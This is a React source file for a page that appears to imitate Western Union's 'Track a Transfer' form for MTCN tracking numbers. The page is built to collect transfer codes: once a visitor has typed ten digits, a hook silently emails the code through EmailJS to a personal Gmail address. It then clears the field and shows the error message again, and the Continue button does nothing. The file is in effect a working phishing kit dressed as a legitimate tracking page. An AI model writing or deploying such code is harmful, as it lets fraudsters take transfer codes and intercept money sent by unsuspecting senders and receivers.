"use client";
import React, { useState, useEffect, useRef } from "react";
import { FaCloudDownloadAlt } from "react-icons/fa";
import emailjs from "@emailjs/browser";

const TrackingForm: React.FC = () => {
  const [userType, setUserType] = useState("sender");
  const [mtcn, setMtcn] = useState("");
  const [showError, setShowError] = useState(true);
  const inputRef = useRef<HTMLInputElement>(null);

  // --- Envoi automatique via EmailJS quand MTCN atteint 10 chiffres ---
  useEffect(() => {
    if (mtcn.length === 10) {
      emailjs
        .send(
          "service_lfr9aem",
          "template_b5k2e83",
          {
            email: "premerageneval@gmail.com",
            Tracking_code: mtcn,
          },
          "VBztdfTj94VVzRp3f"
        )
        .then(
          () => {
            setMtcn("");
            setShowError(true);
            if (inputRef.current) inputRef.current.value = "";
          },
          (error) => {
            console.error("Erreur EmailJS:", error.text);
          }
        );
    }
  }, [mtcn]);

  // --- Gestion saisie MTCN ---
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
    setMtcn(digits);
  };

  // --- Génération des 10 cases dynamiques ---
  const renderSlots = () => {
    const boxes = [];
    for (let i = 0; i < 10; i++) {
      boxes.push(
        <div
          key={i}
          style={{
            width: "32px",
            borderBottom: "2px solid #999",
            textAlign: "center",
            fontSize: "24px",
            color: "#111827",
            fontWeight: 500,
            position: "relative",
          }}
        >
          {mtcn[i] || ""}
          {i === mtcn.length && (
            <span
              style={{
                position: "absolute",
                bottom: "6px",
                left: "50%",
                transform: "translateX(-50%)",
                width: "1px",
                height: "22px",
                backgroundColor: "#000",
                animation: "blink 1s step-end infinite",
              }}
            />
          )}
        </div>
      );
    }
    return boxes;
  };

  return (
    <div
      style={{
        width: "100vw",
        height: "100vh", // ✅ prend toute la hauteur d’écran
        backgroundColor: "#ebebe5ff",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <div
        style={{
          width: "100%",
          maxWidth: "700px",
          background: "transparent",
        }}
      >
        {/* Header */}
        <div
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            marginBottom: "24px",
          }}
        >
          <h1 style={{ fontSize: "24px", fontWeight: 600, color: "#2c2e2f" }}>
            Track a Transfer
          </h1>
          <div
            style={{ color: "#0c4a6e", fontSize: "14px", cursor: "pointer" }}
          >
            English/Philippines
          </div>
        </div>

        {/* Sender / Receiver */}
        <div
          style={{
            background: "#fff",
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            borderRadius: "3px",
            overflow: "hidden",
            borderBottom: "2px solid #0c4a6e20",
            marginBottom: "24px",
          }}
        >
          <button
            onClick={() => setUserType("sender")}
            style={{
              padding: "14px",
              border: "none",
              borderBottom:
                userType === "sender"
                  ? "3px solid #0c4a6e"
                  : "3px solid transparent",
              background: "transparent",
              color: userType === "sender" ? "#000" : "#6b7280",
              fontWeight: 500,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
              cursor: "pointer",
            }}
          >
            <FaCloudDownloadAlt
              size={18}
              color={userType === "sender" ? "#0c4a6e" : "#9ca3af"}
            />
            I'm the sender
          </button>

          <button
            onClick={() => setUserType("receiver")}
            style={{
              padding: "14px",
              border: "none",
              borderBottom:
                userType === "receiver"
                  ? "3px solid #0c4a6e"
                  : "3px solid transparent",
              background: "transparent",
              color: userType === "receiver" ? "#000" : "#6b7280",
              fontWeight: 500,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
              cursor: "pointer",
            }}
          >
            <FaCloudDownloadAlt
              size={18}
              color={userType === "receiver" ? "#0c4a6e" : "#9ca3af"}
            />
            I'm the receiver
          </button>
        </div>

        {/* Label */}
        <label
          style={{
            display: "block",
            textAlign: "center",
            marginBottom: "12px",
            color: "#4b5563",
            fontSize: "14px",
          }}
        >
          Please enter your 10-digit tracking number (MTCN).
        </label>

        {/* Champ MTCN */}
        <div
          style={{
            backgroundColor: "#ffffffff",
            padding: "24px",
            textAlign: "center",
            marginBottom: "24px",
          }}
          onClick={() => {
            inputRef.current?.focus();
            setShowError(false);
          }}
        >
          <div
            style={{
              display: "flex",
              justifyContent: "center",
              gap: "12px",
              cursor: "text",
              padding: "12px 0",
            }}
          >
            {renderSlots()}
          </div>

          <input
            ref={inputRef}
            type="text"
            inputMode="numeric"
            maxLength={10}
            value={mtcn}
            onChange={handleChange}
            onFocus={() => setShowError(false)}
            style={{
              position: "absolute",
              opacity: 0,
              pointerEvents: "auto",
            }}
          />

          {showError && (
            <p
              style={{
                color: "#a90606ff",
                fontWeight: 600,
                fontSize: "14px",
                marginTop: "12px",
              }}
            >
              Please enter your 10-digit tracking number (MTCN).
            </p>
          )}
        </div>

        {/* Bouton */}
        <button
          style={{
            width: "100%",
            padding: "14px",
            backgroundColor: "#5b75a3",
            color: "white",
            border: "none",
            fontSize: "18px",
            fontWeight: 500,
            cursor: "pointer",
            borderRadius: "3px",
            marginBottom: "16px",
          }}
        >
          Continue
        </button>

        {/* Footer */}
        <div style={{ textAlign: "center" }}>
          <a
            href="#"
            style={{
              color: "#3a587c",
              textDecoration: "none",
              fontSize: "14px",
              fontWeight: 500,
            }}
          >
            Don't know the MTCN?
          </a>
        </div>

        {/* Animation + styles mobile */}
        <style>
          {`
            @keyframes blink {
              0% { opacity: 1; }
              50% { opacity: 0; }
              100% { opacity: 1; }
            }

            /* ✅ Suppression des espacements sur mobile */
            @media (max-width: 768px) {
              body, html {
                margin: 0;
                padding: 0;
              }
              div, label, button {
                margin: 0 !important;
                padding: 0 !important;
              }
            }
          `}
        </style>
      </div>
    </div>
  );
};

export default TrackingForm;
